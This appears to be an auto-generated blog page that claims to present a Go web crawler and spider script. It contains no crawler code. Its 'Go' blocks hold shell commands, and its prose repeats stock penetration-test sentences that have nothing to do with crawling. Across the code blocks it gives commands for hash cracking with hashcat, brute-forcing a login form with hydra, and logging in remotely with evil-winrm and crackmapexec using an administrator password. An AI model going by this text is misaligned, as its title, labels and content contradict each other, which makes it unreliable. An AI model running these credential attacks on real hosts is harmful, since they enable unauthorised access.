---
TitleSEO: "Web Crawler and Spider in Go | ZureFX"
TitlePost: "Web Crawler and Spider — Go"
Author: "ZureFX"
Description: "A Go script for web crawler and spider. Built for security research and automation."
Keywords: "bash, scanner, rust, python, go, script"
URL: "https://zurefx.github.io/scripting/script-web-crawler-and-spider-534.html"
URL_IMAGES: ""
Date: "2025-02-10"
Tags: "Bash, Scanner, Rust, Python, Go, Script"
Section: "scripting"
Lang: "en"
main_img: "script-web-crawler-and-spider-534"
Permalink: "/scripting/script-web-crawler-and-spider-534.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `netcat`
- `pwncat`
- `wmiexec`

## Implementation

### Core Logic

Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```go
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
evil-winrm -i 10.63.141.252 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p1433,139,3306 10.36.56.58 -oN scan.txt
```

The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine.

```go
crackmapexec smb 10.81.108.19 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
crackmapexec smb 10.47.28.142 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.120.158.174 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
feroxbuster -h
feroxbuster -h
evil-winrm -i 10.27.233.130 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.22.170.172 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

```
[+] Scanning target...
[+] Found 14 results
[+] Done in 18.46s
```
